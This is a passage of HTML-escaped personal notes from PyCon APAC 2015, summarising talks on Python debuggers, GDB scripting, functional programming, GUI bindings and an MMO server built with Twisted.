&lt;/li&gt;
&lt;li&gt;I cannot interoperate  &lt;ul&gt;
&lt;li&gt;I see dead code.  &lt;/li&gt;
&lt;li&gt;Fortran, C, Cpp  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Django sucks in DjangoCon  &lt;/li&gt;
&lt;li&gt;Let's talk about Java, Why Java?  &lt;ul&gt;
&lt;li&gt;The corporate machine  &lt;/li&gt;
&lt;li&gt;The JVM  &lt;/li&gt;
&lt;li&gt;The Apache Software Foundation  &lt;/li&gt;
&lt;li&gt;Android  &lt;/li&gt;
&lt;li&gt;Big Data  &lt;/li&gt;
&lt;li&gt;..., Acceptable hackerness  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Javasciprt?  &lt;ul&gt;
&lt;li&gt;Ubiquity  &lt;/li&gt;
&lt;li&gt;Gmail  &lt;/li&gt;
&lt;li&gt;Chrome and Virtual Machine race  &lt;ul&gt;
&lt;li&gt;V8  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Javascript, the Good Parts  &lt;/li&gt;
&lt;li&gt;Evented / Async from the ground up  &lt;/li&gt;
&lt;li&gt;JSON  &lt;/li&gt;
&lt;li&gt;..., Acceptable hackerness  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go  &lt;ul&gt;
&lt;li&gt;static binary  &lt;/li&gt;
&lt;li&gt;bottom up for multi-core use  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Go?  &lt;ul&gt;
&lt;li&gt;Rob Pike and Google  &lt;/li&gt;
&lt;li&gt;Pragmatic, small, "fits your brain"  &lt;/li&gt;
&lt;li&gt;Channels and Goroutines  &lt;ul&gt;
&lt;li&gt;centrate all CPUs  &lt;/li&gt;
&lt;li&gt;right now in Python we don't have this feature.  &lt;ul&gt;
&lt;li&gt;Pypy  &lt;/li&gt;
&lt;li&gt;libsvm  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Performance  &lt;ul&gt;
&lt;li&gt;Python was created for simple using, but go focus on multi-core and performance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;High level datatypes  &lt;/li&gt;
&lt;li&gt;gofmt  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://golang.org/cmd/gofmt/"&gt;https://golang.org/cmd/gofmt/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;go run  &lt;/li&gt;
&lt;li&gt;Deployment  &lt;/li&gt;
&lt;li&gt;Speed  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python  &lt;ul&gt;
&lt;li&gt;Let's talk about what we are doing wrong  &lt;/li&gt;
&lt;li&gt;Multi-core, package managemnet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Python?  &lt;ul&gt;
&lt;li&gt;Broad Ecosystem  &lt;ul&gt;
&lt;li&gt;ruby - bind with rails  &lt;/li&gt;
&lt;li&gt;go - small group of UNIX servers  &lt;/li&gt;
&lt;li&gt;python - it's hard to say where python it is, it's everywhere.  &lt;ul&gt;
&lt;li&gt;Every Movie, single media stream today, used Python.  &lt;/li&gt;
&lt;li&gt;Huge strike in the scientific computing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pragmatic, "fits your brain"  &lt;/li&gt;
&lt;li&gt;Teaching language  &lt;/li&gt;
&lt;li&gt;The PyPy R&amp;amp;D division  &lt;/li&gt;
&lt;li&gt;Python 3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python is not just a language, Python is the Python Community.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;When programming functionally in Python - Apua Juan&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Theory in Functional Programming  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.cs.kent.ac.uk/people/staff/dat/miranda/whyfp90.pdf"&gt;Why Functional Programming Matters&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generator Failure?  &lt;ul&gt;
&lt;li&gt;Range object vs Generator  &lt;/li&gt;
&lt;li&gt;這兩個是不一樣的東西，generator 就是跑過就沒了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Coroutine  &lt;ul&gt;
&lt;li&gt;Example in Python Official Document  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;List comprehension from Haskell  &lt;ul&gt;
&lt;li&gt;lambda function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python doesn't provide...  &lt;ul&gt;
&lt;li&gt;Algebraic Data Type? Recursive Data Type? Parametric or generic  &lt;ul&gt;
&lt;li&gt;Class 無助於產生 ADT  &lt;/li&gt;
&lt;li&gt;meta-class 可以，但不完全，還是得定義給了什麼 Class  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pattern Matching  &lt;ul&gt;
&lt;li&gt;_, a = abc(*data)  &lt;/li&gt;
&lt;li&gt;這方面的支援不夠好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Type Class  &lt;ul&gt;
&lt;li&gt;Type Class is NOT "Class"  &lt;/li&gt;
&lt;li&gt;Another form of data abstraction  &lt;/li&gt;
&lt;li&gt;More abstract than ADT  &lt;/li&gt;
&lt;li&gt;It is the abc (Abstract Base Class) in Python  &lt;ul&gt;
&lt;li&gt;Django 大量的使用了 abc  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Monad  &lt;ul&gt;
&lt;li&gt;keyword "Maybe" in Haskell  &lt;/li&gt;
&lt;li&gt;Container, Function for Container  &lt;/li&gt;
&lt;li&gt;Monadic  &lt;ul&gt;
&lt;li&gt;開了個檔案，但是使用 read mode, 並對該 fd 做寫入, 不應該改動  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Type System  &lt;ul&gt;
&lt;li&gt;Python use Duck Typing, so we basically don't use specific type.  &lt;/li&gt;
&lt;li&gt;Annotation for type checking in the future Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generic Function  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fcn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="o"&gt;---&lt;/span&gt;  
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fcn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Python lacks somthing in Functional Programming  &lt;ul&gt;
&lt;li&gt;imperative vs declarative  &lt;/li&gt;
&lt;li&gt;interpreted vs compiled  &lt;/li&gt;
&lt;li&gt;dynamic typed vs static typed  &lt;/li&gt;
&lt;li&gt;Python 基本上偏左邊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Python Debugger Uncovered - Dmitry Trofimov&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;about this talk  &lt;ul&gt;
&lt;li&gt;how to trace Python programs  &lt;/li&gt;
&lt;li&gt;show implementation of a Python Debugger  &lt;/li&gt;
&lt;li&gt;lots of code  &lt;/li&gt;
&lt;li&gt;PyDev  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python debuggers  &lt;ul&gt;
&lt;li&gt;Implemented in Python  &lt;ul&gt;
&lt;li&gt;pdb, PyCharm, Pydev  &lt;/li&gt;
&lt;li&gt;platform independent: CPython, Jython, PyPy, IronPython  &lt;/li&gt;
&lt;li&gt;Can be broken by user code (can be prevented by tricky fixes)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Implemented in C  &lt;ul&gt;
&lt;li&gt;winpdb, Wing, gdb(with Python mappings)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tracing Python code with Python  &lt;ul&gt;
&lt;li&gt;sys.settrace(tracefunc)  &lt;ul&gt;
&lt;li&gt;call, line, reutrn, c_call, c_return, c_exception  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Simple Trace Function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;tracefunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; on #&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt; % (event, frame.f_lineno))  &lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;tracefunc&lt;/span&gt;  

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;  

&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tracefunc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Let's make simple Python debugger  &lt;ul&gt;
&lt;li&gt;Console Debugger  &lt;/li&gt;
&lt;li&gt;Visual Debugger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protocol  &lt;ul&gt;
&lt;li&gt;every message is a line  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Command Types  &lt;ul&gt;
&lt;li&gt;Set Breakpoint  &lt;/li&gt;
&lt;li&gt;Resume  &lt;/li&gt;
&lt;li&gt;Get Threads  &lt;/li&gt;
&lt;li&gt;Get Frame  &lt;/li&gt;
&lt;li&gt;Evaluate Expression  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IDE  &lt;ul&gt;
&lt;li&gt;Creates server socket  &lt;/li&gt;
&lt;li&gt;Launches a script being debugged with a command  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Debugger Main Code  &lt;/li&gt;
&lt;li&gt;Demo  &lt;/li&gt;
&lt;li&gt;Important Features  &lt;ul&gt;
&lt;li&gt;Conditional Breakpoints  &lt;/li&gt;
&lt;li&gt;Exception Breakpoint  &lt;/li&gt;
&lt;li&gt;Step Over / Step Into / Run to Line  &lt;/li&gt;
&lt;li&gt;PYthon 2.4 to Python 3.4  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.python.org/moin/PythonDebuggers"&gt;https://wiki.python.org/moin/PythonDebuggers&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Programmatic Debugging with GDB and Python - Scott Tsai&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;debug C / C++ code with Python  &lt;/li&gt;
&lt;li&gt;GDB  &lt;ul&gt;
&lt;li&gt;set a Conditional Breakpoint  &lt;/li&gt;
&lt;li&gt;set a Breakpoint that only triggers for a specific thread  &lt;/li&gt;
&lt;li&gt;Debug multiple process  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Getting a Python Prompt in GDB  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb  
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; python-interactive  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;GDB Embedding IPython  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(In some .py file)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;IPython&lt;/span&gt;  
&lt;span class="n"&gt;IPython&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;embed_kernel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(In some shell)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb -x gdb-ipython.py  
$ ipython3 console kernel-xxx.json  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb -q /bin/true  
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; start  
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; python-interactive  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;How Source Level Debugging works?  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gcc -g&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;eu-strip -f xxx.debug xxx&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;eu-strip - split debug info  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Do my binaries have debug info?  &lt;ul&gt;
&lt;li&gt;Look for the .debug_info section  &lt;/li&gt;
&lt;li&gt;.gnu_debuglink  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DWARF ELF Sections  &lt;ul&gt;
&lt;li&gt;.debug_abbrev  &lt;/li&gt;
&lt;li&gt;.debug_info  &lt;/li&gt;
&lt;li&gt;pyelftools  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;pip install pyelftools&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linux Distros Provide Debug Info  &lt;ul&gt;
&lt;li&gt;(Fedora, Red Hat)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;debug-info install $PACKGENAME&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CPython and Numpy has debug info, butt libz.so and other externel libraries don't.  &lt;/li&gt;
&lt;li&gt;Debug multiprocess with gdb  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;set detach-on-fork off  
set traget-async on  
set pagination off  
add-inferior  
...  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Debug Optimized Code  &lt;ul&gt;
&lt;li&gt;use gdb to alter the control flow  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;The Future of GUI Programming with Python - Tzu-ping Chung&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Tkinter  &lt;ul&gt;
&lt;li&gt;Python's de-facto standard GUI  &lt;/li&gt;
&lt;li&gt;Native nowhere  &lt;ul&gt;
&lt;li&gt;Themed Tk  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Binding to Tcl/Tk  &lt;/li&gt;
&lt;li&gt;Lean, but may be lacking  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Platform-specific  &lt;ul&gt;
&lt;li&gt;PyObjC on OS X (Cocoa)  &lt;/li&gt;
&lt;li&gt;WIn32API on Windows  &lt;/li&gt;
&lt;li&gt;PyGObject on Gnome (GTK+)  &lt;/li&gt;
&lt;li&gt;Native UI/UX  &lt;/li&gt;
&lt;li&gt;Needs to deploy C Binding  &lt;/li&gt;
&lt;li&gt;Very weird API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Binding  &lt;/li&gt;
&lt;li&gt;Let's Build Everything  &lt;ul&gt;
&lt;li&gt;Kivy and Pyglet  &lt;/li&gt;
&lt;li&gt;Cross-platform application code  &lt;/li&gt;
&lt;li&gt;Nice Pythonic API  &lt;/li&gt;
&lt;li&gt;Needs to deploy C binding  &lt;/li&gt;
&lt;li&gt;Not Native (and they don't care)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Licensing  &lt;ul&gt;
&lt;li&gt;GPL and LGPL  &lt;/li&gt;
&lt;li&gt;Source distribution  &lt;/li&gt;
&lt;li&gt;Static linking  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What I want  &lt;ul&gt;
&lt;li&gt;Native UI and UX  &lt;/li&gt;
&lt;li&gt;Portability  &lt;/li&gt;
&lt;li&gt;Ease to Deploy  &lt;/li&gt;
&lt;li&gt;Pythonic API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Solution (IMO)  &lt;ul&gt;
&lt;li&gt;Dynamic binding to native GUI  &lt;/li&gt;
&lt;li&gt;CPython compatibility  &lt;/li&gt;
&lt;li&gt;No non-Python dependencies  &lt;/li&gt;
&lt;li&gt;Wrapper on top  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Binding  &lt;ul&gt;
&lt;li&gt;Foreign function interface (FFI)  &lt;/li&gt;
&lt;li&gt;libffi  &lt;/li&gt;
&lt;li&gt;ctypes  &lt;/li&gt;
&lt;li&gt;CFFI, anyone?  &lt;/li&gt;
&lt;li&gt;related links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cffi.readthedocs.org/en/latest/"&gt;https://cffi.readthedocs.org/en/latest/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/ctypes.html"&gt;https://docs.python.org/2/library/ctypes.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://eli.thegreenplace.net/2013/03/09/python-ffi-with-ctypes-and-cffi"&gt;http://eli.thegreenplace.net/2013/03/09/python-ffi-with-ctypes-and-cffi&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Foreign_function_interface"&gt;http://en.wikipedia.org/wiki/Foreign_function_interface&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sourceware.org/libffi/"&gt;https://sourceware.org/libffi/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model  &lt;ul&gt;
&lt;li&gt;Ideal: Python API wrapper &amp;lt;=&amp;gt; Binding (in Python) &amp;lt;=&amp;gt; Native API  &lt;/li&gt;
&lt;li&gt;Windows: Python API Wrapper &amp;lt;=&amp;gt; ctypes &amp;lt;=&amp;gt; Native API  &lt;/li&gt;
&lt;li&gt;Ubuntu: Python API Wrapper &amp;lt;=&amp;gt; ctypes &amp;lt;=&amp;gt; Native API  &lt;/li&gt;
&lt;li&gt;OS X: Python API Wrapper &amp;lt;=&amp;gt; { ctypes / ctypes + wrapper &amp;lt;=&amp;gt; objectvie-c API}&amp;lt;=&amp;gt; C API (e.g. CoreFoundation)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pybee/toga"&gt;toga&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://pybee.org/toga/"&gt;http://pybee.org/toga/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install toga-demo  
$ toga-demo  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Difficulties  &lt;ul&gt;
&lt;li&gt;API Design  &lt;/li&gt;
&lt;li&gt;Platform  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile Problem  &lt;ul&gt;
&lt;li&gt;Python  &lt;/li&gt;
&lt;li&gt;Different Paradigms  &lt;/li&gt;
&lt;li&gt;"The Store"  &lt;/li&gt;
&lt;li&gt;Android, iOS, Windows Phone  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://lwn.net/Articles/640625"&gt;http://lwn.net/Articles/640625&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile Support  &lt;ul&gt;
&lt;li&gt;C API Availability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Activity Stack / Fragment  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;RPyScan&lt;/h4&gt;
&lt;p&gt;用 Raspberry Pi + Python 自幹 3D 人體掃描機，因為買現成的太貴了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;MMO Server Design with Twisted.py - Dan Maas&lt;/h4&gt;
&lt;p&gt;// 這外國講者的中文講的真的蠻標準的  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SPINPUNCH  &lt;/li&gt;
&lt;li&gt;THUNDER RUN  &lt;/li&gt;
&lt;li&gt;Topics  &lt;ul&gt;
&lt;li&gt;System Architecture  &lt;/li&gt;
&lt;li&gt;How to write asynchronous HTTP server with Twisted  &lt;/li&gt;
&lt;li&gt;How to profile Asynchronous Server  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Game = Engine + Game Data + Art  &lt;ul&gt;
&lt;li&gt;Engine: Server, Client, Analytics  &lt;/li&gt;
&lt;li&gt;Game Data: Units, buildings, items  &lt;/li&gt;
&lt;li&gt;Art: Images, Sounds  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Engine  &lt;ul&gt;
&lt;li&gt;Client / Server "web app"  &lt;/li&gt;
&lt;li&gt;Server: Python  &lt;/li&gt;
&lt;li&gt;Client: JavaScript / HTML5 Canvas  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Won't be mention today  &lt;ul&gt;
&lt;li&gt;Analytics system (SQL, map/reduce)  &lt;/li&gt;
&lt;li&gt;Gamedata build pipeline  &lt;/li&gt;
&lt;li&gt;Art build pipeline  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server  &lt;ul&gt;
&lt;li&gt;Client sends requests (by HTTP) to run gmae actions  &lt;ul&gt;
&lt;li&gt;"Upgrade this building"  &lt;/li&gt;
&lt;li&gt;"Produce this unit"  &lt;/li&gt;
&lt;li&gt;"Buy this thing in the Store"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Check requirements, if OK, then mutate player state, send reply  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server Design Requirements  &lt;ul&gt;
&lt;li&gt;High Scale  &lt;ul&gt;
&lt;li&gt;20,000+ daily players  &lt;/li&gt;
&lt;li&gt;2,000+ concurrent players  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Low latency  &lt;ul&gt;
&lt;li&gt;cannot greater than 1xx ms  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server Implementation  &lt;ul&gt;
&lt;li&gt;Python  &lt;/li&gt;
&lt;li&gt;Twisted Asynchronous HTTP server  &lt;/li&gt;
&lt;li&gt;Cluster of processes (on Amazon EC2)  &lt;/li&gt;
&lt;li&gt;Support ~ 100 online players per CPU  &lt;ul&gt;
&lt;li&gt;Scaling by adding cores  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What is Twisted?  &lt;ul&gt;
&lt;li&gt;Network library  &lt;/li&gt;
&lt;li&gt;Asynchronous event loop, like NGINX  &lt;/li&gt;
&lt;li&gt;Supports many internet protocols  &lt;ul&gt;
&lt;li&gt;HTTP  &lt;/li&gt;
&lt;li&gt;SSH  &lt;/li&gt;
&lt;li&gt;FTP  &lt;/li&gt;
&lt;li&gt;SMTP  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Consistent Python API, not every easy but really consistent  &lt;/li&gt;
&lt;li&gt;Easy to extend with custom classes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Asynchronous server  &lt;/li&gt;
&lt;li&gt;use both synchronous and asynchronous code  &lt;ul&gt;
&lt;li&gt;not every computation are suitable with asynchronous  &lt;/li&gt;
&lt;li&gt;synchronous code is easier to write  &lt;/li&gt;
&lt;li&gt;synchronous (99%)  &lt;ul&gt;
&lt;li&gt;fast: 1 - 100 ms  &lt;ul&gt;
&lt;li&gt;attack  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;asynchronous (1%)  &lt;ul&gt;
&lt;li&gt;slow: 100ms - 10 seconds  &lt;ul&gt;
&lt;li&gt;Reading/writing Amazon S3 on login/logout  &lt;/li&gt;
&lt;li&gt;Quering Facebook API  &lt;/li&gt;
&lt;li&gt;Top scores database query  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Write an asynchronous http server by using Twisted  &lt;ul&gt;
&lt;li&gt;reactor  &lt;/li&gt;
&lt;li&gt;twisted.web.NOT_DONE_YET  &lt;/li&gt;
&lt;li&gt;request.write("Hello")  &lt;/li&gt;
&lt;li&gt;request.finish()  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to connect "before" and "after"  &lt;/li&gt;
&lt;li&gt;inlineCallbacks (decorator) in Twisted  &lt;/li&gt;
&lt;li&gt;Collect data on each request  &lt;ul&gt;
&lt;li&gt;Average latency (performance hotspot)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Watch total "unhalted" time  &lt;ul&gt;
&lt;li&gt;What % of the time the CPU is waiting for the next request?  &lt;/li&gt;
&lt;li&gt;50% = danger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Day 2- 2015/06/06 - Sat&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/PyCon-APAC-2015-Day-2-June-6-gLUoM6krKOq"&gt;PyCon APAC 2015 - Day 2 (June 6) - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;GIL - Tzung-Bi Shih&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://github.com/penvirus/gil1"&gt;https://github.com/penvirus/gil1&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Introduction  &lt;ul&gt;
&lt;li&gt;Global Interpreter Lock  &lt;ul&gt;
